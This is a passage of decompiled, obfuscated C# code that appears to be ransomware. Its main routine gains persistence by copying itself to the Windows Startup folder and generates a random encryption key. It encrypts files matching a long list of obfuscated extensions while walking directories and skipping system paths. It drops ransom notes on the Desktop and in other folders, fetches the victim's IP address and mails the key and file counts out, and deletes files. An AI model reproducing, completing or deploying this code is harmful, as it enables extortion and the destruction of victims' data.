								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107386773), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, lrVhqMPbYlaOK);
								}
								else
								{
									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, getString_0(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107386220) + ex14.Message + getString_0(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								return;
							}
						}
						if (IooTTsvIiwCN)
						{
							if (ZDxRrpKTbd != getString_0(107386778))
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, bytes2);
							}
							else
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			WNvdcTPDgW.Remove(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
		}

		static kFfBlUyayStE()
		{
			Strings.CreateGetStringDelegate(typeof(kFfBlUyayStE));
		}
	}

	private sealed class wVXqIBGGPLo
	{
		public string atoCyWSfKSy;

		public string fRxskrnPHhc;

		public void _003CEncrypt2_003Eb__3f()
		{
			while (true)
			{
				try
				{
					File.Delete(atoCyWSfKSy);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					if (File.Exists(fRxskrnPHhc))
					{
						File.Delete(fRxskrnPHhc);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string tTTuIqIyTVsKt;

	public static byte[] lrVhqMPbYlaOK;

	public static string kvJFoDYMuC;

	public static string cJvZgRMCiiT;

	public static List<string> HoHveMjVjvX;

	public static List<string> YtNGHYTThvg;

	public static string YsJopGaPpPETyH;

	public static string nyAmnOdcSzzfJ;

	public static string AFNtNBdAhEf;

	public static string zcPzHRZXYSoC;

	public static int PNgOzFQmoBxwkpD;

	public static string cySCSfjuDKIn;

	public static string mfIGHgxpUFhf;

	public static string vCBJiLpGmJSnD;

	public static string ARhmLIZgWToPak;

	public static string HUAsnTLTOzrk;

	public static string TaRSuIXzPFDe;

	public static string EBwCzzKShZJF;

	public static string xRKOGhAaTewo;

	public static List<string> vooFhNgKVZyUs;

	public static List<string> SlSeSNfJnzNh;

	public static string gqVCQVtJiavX;

	public static string oLgSSCEqAmbBry;

	public static string zSIqMRAKpkZZcGjv;

	public static List<string> yGkMwQPqUdXIj;

	public static string MSHRwSPpwmqxM;

	private static string FAZqQTFurwccxTs;

	public static string iEHeKlEPYHGI;

	public static string xYvGfyjIeZ;

	public static List<string> ZSNcfBFfJEfqQ;

	public static List<string> iSGwXCiIfXBR;

	public static List<string> jFoYvbvoLRCagvDFmn;

	public static List<string> BSHtnNKwjXivMJS;

	public static string AbUTAcXZWDez;

	public static List<string> hkXnlfpoGpnf;

	public static List<string> gNbydKfEzpWjv;

	public static string apDKFRuernzH;

	public static string rmnvFBReavI;

	internal static DateTime mfBqYHSOySd;

	internal static DateTime mvolkwWivlBcrm;

	public static string CdQMIPJOkrOUDSy;

	public static string xYkYbBCyjIxz;

	public static string eIevaseXuHQaH;

	public static string bdIGvvMoxCbM;

	public static string TuoGtjjIwGaoMFyS;

	public static string ofNBDRGhqfTF;

	public static string kdEfNQYswVmDU;

	public static string bxhZXFvKXZl;

	public static List<string> EKjYgfCTgvyfhvOPx;

	public static string vEWBFQaTPDgk;

	public static string PyFcFDpqJkSW;

	public static string MIRuXWVFFoLwtz;

	public static string VsxmPTvejQSFs;

	public static string ZxaKxHsjfdsdTvNKy;

	public static string KtQjokjXHZXUlt;

	public static string nvUGpJjfEl;

	public static string esDOwQNWzCks;

	public static string RzJDQuVkTCTlk;

	public static string vKUIQhdzgPHwb;

	public static string GfViqMwSHVEX;

	public static string IUCNbNITnGCo;

	public static string sQphlXbTpcR;

	public static string ltuxRtIPjttT;

	public static string aDFaQrSzgBxEj;

	public static string nLNEEVaUjoQklOdfI;

	public static string anwdjQbJZQFrk;

	public static string PxoomWcCvZubT;

	public static string NRDQBoJkcw;

	public static string LIbWxYpDOmPy;

	public static string rHeEvpAbjCjyvEaC;

	public static string NfiNMrNQVxA;

	public static string JOmKsEZdamZ;

	public static string befQPNWerVGdKp;

	public static string aEpEnRRNDPnpp;

	public static string QArBXOfqRoEA;

	public static string QGAYpwMzxm;

	public static string cbYwmSYgAK;

	public static string tMTGisYcNMVHo;

	public static string[] tPINiNFcqTnZtQ;

	public static string POXokwFKrkkHxdVH;

	public static bool VGKELVlTFUV;

	public static string ZHbEFyHPlfyw;

	public static bool IooTTsvIiwCN;

	public static bool fOGrPeGaBiaPoAHL;

	public static bool MVhCfgBRSEUkeJ;

	public static bool NBgAYvhpqTo;

	public static string jnRLNtXuRRg;

	public static bool joesCNAxeHUI;

	public static bool XqTYpFCObzAK;

	public static bool WmBMdIXNbOD;

	public static bool upflSQRmeWP;

	public static bool EcdpqbMrQOzfdgL;

	public static string diaHTfOFnw;

	public static bool qoRjYABduZF;

	public static Stopwatch uYmJJOwnKLBSZO;

	public static int iePhSHBTqLd;

	public static int XnicJWCgBOO;

	public static bool MiZHZrKmtKkaPXn;

	public static string RBZnAGRnuwHeRmi;

	public static string[] sohDoFMGJgbq;

	public static List<string> HXQxyzlRKB;

	public static int rHOZvgFGaXKMdexR;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			dkdfdmXmxAk CS_0024_003C_003E8__locals0 = new dkdfdmXmxAk();
			CS_0024_003C_003E8__locals0.sZxLlvESUzLZXKq = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.sZxLlvESUzLZXKq) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			oFzjyQZaztDJ.QdsUxwYDRCW(FAZqQTFurwccxTs);
		}
		catch (Exception)
		{
		}
		try
		{
			if (QArBXOfqRoEA == getString_0(107396855))
			{
				Thread thread = new Thread(YbwphERrMyQNP.nxNqSDnFrzzj);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (vCBJiLpGmJSnD == getString_0(107396855))
		{
			Thread.Sleep(int.Parse(ARhmLIZgWToPak));
		}
		if (MIRuXWVFFoLwtz == getString_0(107396855))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					OjfhzFWYFdyA CS_0024_003C_003E8__locals1 = new OjfhzFWYFdyA();
					CS_0024_003C_003E8__locals1.JNtjaLfncUVSAvQ = new string[4]
					{
						GwTsezEgVAuVAU(getString_0(107396850)),
						GwTsezEgVAuVAU(getString_0(107396865)),
						GwTsezEgVAuVAU(getString_0(107396816)),
						GwTsezEgVAuVAU(getString_0(107396787))
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						PmZcbpYMQkkuHdO.xRTdqUJOGhXP(CS_0024_003C_003E8__locals1.JNtjaLfncUVSAvQ);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(getString_0(107396865)));
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(getString_0(107396787)));
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(getString_0(107396802)));
			}
			catch
			{
			}
			try
			{
				tEHWewuHPsL.xmOmWWdnfrenPY(GwTsezEgVAuVAU(getString_0(107396816)));
			}
			catch
			{
			}
			Thread thread3 = new Thread(PmZcbpYMQkkuHdO.SmzpdOGqBUsqf);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && kdEfNQYswVmDU == getString_0(107396855))
		{
			try
			{
				xcFsifoFernH(GwTsezEgVAuVAU(getString_0(107396753)));
			}
			catch
			{
			}
		}
		try
		{
			if (EBwCzzKShZJF == getString_0(107396855) && CyVDCXKNZkh.fziPGhgQsXRkJJwbm())
			{
				new dDyurqCmIYO().iRhAYdJtRklx(bool_0: false);
				CyVDCXKNZkh.jDuYrMVMSFRfuZ();
			}
		}
		catch (Exception)
		{
		}
		if (oLgSSCEqAmbBry == getString_0(107396855) && CyVDCXKNZkh.fziPGhgQsXRkJJwbm())
		{
			new dDyurqCmIYO().iRhAYdJtRklx(bool_0: false);
			new dDyurqCmIYO().snmtsQVthnGhgVm();
		}
		if (mfIGHgxpUFhf == getString_0(107396855))
		{
			SXJylLGRkSghP.AfvdtDeOuqUqWT();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397192);
			string text2 = text + Path.GetFileName(fileName);
			if (zcPzHRZXYSoC == getString_0(107396855) && fileName != text2)
			{
				Thread thread4 = new Thread(OqNXuKZRwQi);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (YsJopGaPpPETyH == getString_0(107396855) && mainModule != null && fileName != text2)
			{
				try
				{
					PNgOzFQmoBxwkpD = NBIIvjpPJwlyjG(0, vooFhNgKVZyUs.Count);
					File.Copy(fileName, text + vooFhNgKVZyUs[PNgOzFQmoBxwkpD], overwrite: true);
					Process.Start(text + vooFhNgKVZyUs[PNgOzFQmoBxwkpD]);
					yQfvyropwD();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (apDKFRuernzH == getString_0(107396855) && DateTime.Now < mfBqYHSOySd)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (rmnvFBReavI == getString_0(107396855) && DateTime.Now > mvolkwWivlBcrm)
			{
				yQfvyropwD();
			}
		}
		catch
		{
		}
		UQZfYOBEqlkpb();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> source = iSGwXCiIfXBR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386181)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source2 = jFoYvbvoLRCagvDFmn;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386136)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				if (tMTGisYcNMVHo == getString_0(107396855))
				{
					string[] source3 = tPINiNFcqTnZtQ;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386136)), getString_0(107386143) + string_0 + getString_0(107386102));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				if (!PAhtGWwudbxozQK().Contains(getString_0(107386878)))
				{
					AiwyVzAQMcDi(AbUTAcXZWDez);
				}
				else
				{
					List<string> bSHtnNKwjXivMJS = BSHtnNKwjXivMJS;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
						{
							KXNiSRaxzeIpPt(GwTsezEgVAuVAU(VSGqbgWciAAQ(getString_0(107386097))), string_0);
						};
					}
					Parallel.ForEach(bSHtnNKwjXivMJS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				List<string> source4 = hkXnlfpoGpnf;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(getString_0(107386072)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397187))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397187)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397138)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !HoHveMjVjvX.Contains(text6) && text6 != getString_0(107397149) && text6 != getString_0(107397128) && text6 != getString_0(107397075))
								{
									HoHveMjVjvX.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397046)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397065))
						{
							sQphlXbTpcR = getString_0(107396855);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397056))
						{
							sQphlXbTpcR = getString_0(107397015);
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107397010) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (sQphlXbTpcR == getString_0(107397015))
		{
			GClBSyQehj();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MVhCfgBRSEUkeJ)
			{
				try
				{
					Thread thread6 = new Thread(IUmAujruwdxT.NcgkgbiyeApEB);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			KXNiSRaxzeIpPt(getString_0(107396997), GwTsezEgVAuVAU(getString_0(107396440)));
		}
		SecureString secureString = new SecureString();
		if (eIevaseXuHQaH == getString_0(107397015))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					k--;
				}
			}
		}
		else
		{
			nyAmnOdcSzzfJ = getString_0(107396367);
		}
		AFNtNBdAhEf = FlpXYRWvTX.ZTvekdOmyg(cYzqjSUrbP(secureString));
		if (WmBMdIXNbOD)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw), string.Concat(GwTsezEgVAuVAU(getString_0(107396354)), new WebClient().DownloadString(GwTsezEgVAuVAU(getString_0(107396329))), getString_0(107396288), GwTsezEgVAuVAU(getString_0(107396251)), DateTime.Now, getString_0(107396288), GwTsezEgVAuVAU(getString_0(107396210)), AFNtNBdAhEf));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw), getString_0(107396665) + AFNtNBdAhEf);
				}
			}
			catch (Exception ex9)
			{
				if (joesCNAxeHUI)
				{
					try
					{
						File.AppendAllText(jnRLNtXuRRg, getString_0(107396636) + ex9.Message + getString_0(107396288));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		cqqMHKHKHQkt.MzToDMiFBwaOs(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), LIbWxYpDOmPy), mpBrVYdLlDe(AFNtNBdAhEf), null, null, getString_0(107396619), getString_0(107396570), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			NzZJHUVbSXZd();
		}
		try
		{
			try
			{
				if (qoRjYABduZF)
				{
					Console.WriteLine(getString_0(107396585));
				}
			}
			catch
			{
			}
			gwzRtxANhzJ(new string[1] { getString_0(107396504) }, new string[100]
			{
				getString_0(107396495),
				getString_0(107396522),
				getString_0(107396517),
				getString_0(107396476),
				getString_0(107396471),
				getString_0(107396466),
				getString_0(107396461),
				getString_0(107396488),
				getString_0(107396483),
				getString_0(107396478),
				getString_0(107395929),
				getString_0(107395924),
				getString_0(107395947),
				getString_0(107395942),
				getString_0(107395933),
				getString_0(107395896),
				getString_0(107395891),
				getString_0(107395886),
				getString_0(107395913),
				getString_0(107395908),
				getString_0(107395867),
				getString_0(107395862),
				getString_0(107395857),
				getString_0(107395884),
				getString_0(107395879),
				getString_0(107395874),
				getString_0(107395869),
				getString_0(107395832),
				getString_0(107395827),
				getString_0(107395822),
				getString_0(107395849),
				getString_0(107395844),
				getString_0(107395839),
				getString_0(107395802),
				getString_0(107395793),
				getString_0(107395820),
				getString_0(107395815),
				getString_0(107395810),
				getString_0(107396461),
				getString_0(107395805),
				getString_0(107396483),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395786),
				getString_0(107395781),
				getString_0(107395776),
				getString_0(107395739),
				getString_0(107395734),
				getString_0(107395729),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395746),
				getString_0(107395741),
				getString_0(107395704),
				getString_0(107395699),
				getString_0(107395694),
				getString_0(107395721),
				getString_0(107395716),
				getString_0(107396187),
				getString_0(107396182),
				getString_0(107396173),
				getString_0(107396192),
				getString_0(107395805),
				getString_0(107396147),
				getString_0(107396170),
				getString_0(107396161),
				getString_0(107396120),
				getString_0(107396111),
				getString_0(107396134),
				getString_0(107396129),
				getString_0(107396088),
				getString_0(107396079),
				getString_0(107396102),
				getString_0(107396097),
				getString_0(107396060),
				getString_0(107396055),
				getString_0(107396050),
				getString_0(107396045),
				getString_0(107396072),
				getString_0(107396063),
				getString_0(107396026),
				getString_0(107396021),
				getString_0(107396016),
				getString_0(107396043),
				getString_0(107396038),
				getString_0(107396029),
				getString_0(107395988),
				getString_0(107395983),
				getString_0(107395839),
				getString_0(107396010),
				getString_0(107396005),
				getString_0(107396000),
				getString_0(107395963),
				getString_0(107395958),
				getString_0(107395949),
				getString_0(107395976),
				getString_0(107395971),
				getString_0(107395418),
				getString_0(107395413),
				getString_0(107395408)
			}, new string[0], cYzqjSUrbP(secureString), getString_0(107395435));
		}
		catch (Exception ex11)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107395422) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397));
				streamWriter.WriteLine(GwTsezEgVAuVAU(getString_0(107395364)));
				streamWriter.WriteLine(getString_0(107396288));
				streamWriter.WriteLine(GwTsezEgVAuVAU(getString_0(107393418)));
				streamWriter.WriteLine(AFNtNBdAhEf);
				if (iEHeKlEPYHGI == getString_0(107397015))
				{
					streamWriter.WriteLine(getString_0(107396288));
					streamWriter.WriteLine(GwTsezEgVAuVAU(getString_0(107392873)) + Convert.ToString(yGkMwQPqUdXIj.Count));
				}
				if (MiZHZrKmtKkaPXn)
				{
					streamWriter.WriteLine(getString_0(107396288));
					streamWriter.WriteLine(GwTsezEgVAuVAU(getString_0(107392764)));
					streamWriter.WriteLine(GyWbmViNanxKl.nFyAFAYBITHjh());
				}
			}
			else
			{
				string text8 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397));
				if (!text8.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397), getString_0(107392731) + AFNtNBdAhEf);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in SlSeSNfJnzNh)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395397)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397), item + getString_0(107395397), overwrite: true);
				}
				else
				{
					string text9 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397));
					if (!text9.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
					{
						File.AppendAllText(item + getString_0(107395397), getString_0(107392731) + AFNtNBdAhEf);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!NBgAYvhpqTo && num > 10)
			{
				break;
			}
		}
		if (JOmKsEZdamZ == getString_0(107396855))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392734)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392734));
					streamWriter2.WriteLine(GwTsezEgVAuVAU(getString_0(107392701)));
					streamWriter2.WriteLine(getString_0(107396288));
					streamWriter2.WriteLine(GwTsezEgVAuVAU(getString_0(107389483)));
					streamWriter2.WriteLine(AFNtNBdAhEf + GwTsezEgVAuVAU(getString_0(107389362)));
					if (iEHeKlEPYHGI == getString_0(107397015))
					{
						streamWriter2.WriteLine(getString_0(107396288));
						streamWriter2.WriteLine(GwTsezEgVAuVAU(getString_0(107389381)) + GwTsezEgVAuVAU(getString_0(107392873)) + Convert.ToString(yGkMwQPqUdXIj.Count) + GwTsezEgVAuVAU(getString_0(107389362)));
					}
					if (MiZHZrKmtKkaPXn)
					{
						streamWriter2.WriteLine(getString_0(107396288));
						streamWriter2.WriteLine(GwTsezEgVAuVAU(getString_0(107392764)));
						streamWriter2.WriteLine(GyWbmViNanxKl.nFyAFAYBITHjh());
					}
				}
				else
				{
					string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397));
					if (!text10.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392734), GwTsezEgVAuVAU(getString_0(107389381)) + getString_0(107392731) + AFNtNBdAhEf + GwTsezEgVAuVAU(getString_0(107389362)));
					}
				}
			}
			catch
			{
			}
		}
		if (MSHRwSPpwmqxM == getString_0(107396855))
		{
			try
			{
				if (iEHeKlEPYHGI == getString_0(107397015))
				{
					GyWbmViNanxKl.ATmjNWylGeJO(getString_0(107389320), getString_0(107389315), getString_0(107388758), string.Concat(GwTsezEgVAuVAU(getString_0(107396354)), new WebClient().DownloadString(GwTsezEgVAuVAU(getString_0(107396329))), getString_0(107388749), GwTsezEgVAuVAU(getString_0(107396251)), DateTime.Now, getString_0(107396288), GwTsezEgVAuVAU(getString_0(107388776)), Convert.ToString(yGkMwQPqUdXIj.Count), getString_0(107396288), GwTsezEgVAuVAU(getString_0(107396210)), AFNtNBdAhEf));
				}
				else
				{
					GyWbmViNanxKl.ATmjNWylGeJO(getString_0(107389320), getString_0(107389315), getString_0(107388758), string.Concat(GwTsezEgVAuVAU(getString_0(107396354)), new WebClient().DownloadString(GwTsezEgVAuVAU(getString_0(107396329))), getString_0(107388749), GwTsezEgVAuVAU(getString_0(107396251)), DateTime.Now, getString_0(107396288), GwTsezEgVAuVAU(getString_0(107388776)), Convert.ToString(yGkMwQPqUdXIj.Count), getString_0(107396288), GwTsezEgVAuVAU(getString_0(107396210)), AFNtNBdAhEf));
				}
			}
			catch
			{
			}
		}
		if (xRKOGhAaTewo == getString_0(107396855))
		{
			try
			{
				ccZAZbktzmqn.ETTZIVoqCtRonH(new Uri(getString_0(107388695)));
			}
			catch
			{
			}
		}
		if (JOmKsEZdamZ == getString_0(107397015))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397)))
				{
					Process.Start(GwTsezEgVAuVAU(getString_0(107388694)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395397));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392734)))
				{
					Process.Start(GwTsezEgVAuVAU(getString_0(107388701)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392734));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(KtQjokjXHZXUlt))
		{
			try
			{
				File.Delete(KtQjokjXHZXUlt);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397187))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397187)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(jnRLNtXuRRg, getString_0(107388684) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (joesCNAxeHUI)
		{
			try
			{
				File.AppendAllText(jnRLNtXuRRg, getString_0(107388639));
			}
			catch (Exception)
			{
			}
		}
		if (tTTuIqIyTVsKt == getString_0(107388594))
		{
			yQfvyropwD();
		}
	}

	public static void OqNXuKZRwQi()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(GwTsezEgVAuVAU(getString_0(107388617)), GwTsezEgVAuVAU(getString_0(107388943)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NBIIvjpPJwlyjG(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> bUTxlfgHAvCR(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107388914)) && !text.Contains(getString_0(107388889)) && !text.Contains(getString_0(107388856)) && !text.ToLower().Contains(getString_0(107388871)) && !text.ToLower().Contains(getString_0(107388826)) && !text.Contains(getString_0(107388833)) && !text.Contains(getString_0(107388812)) && !text.ToLower().Contains(getString_0(107388799)) && !text.ToLower().Contains(getString_0(107388242)) && !text.ToLower().Contains(getString_0(107388205)) && !text.ToLower().Contains(getString_0(107388228)) && !text.ToLower().Contains(getString_0(107388179)) && !text.ToLower().Contains(getString_0(107388198)) && !text.ToLower().Contains(getString_0(107388153)) && !text.ToLower().Contains(getString_0(107388164)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
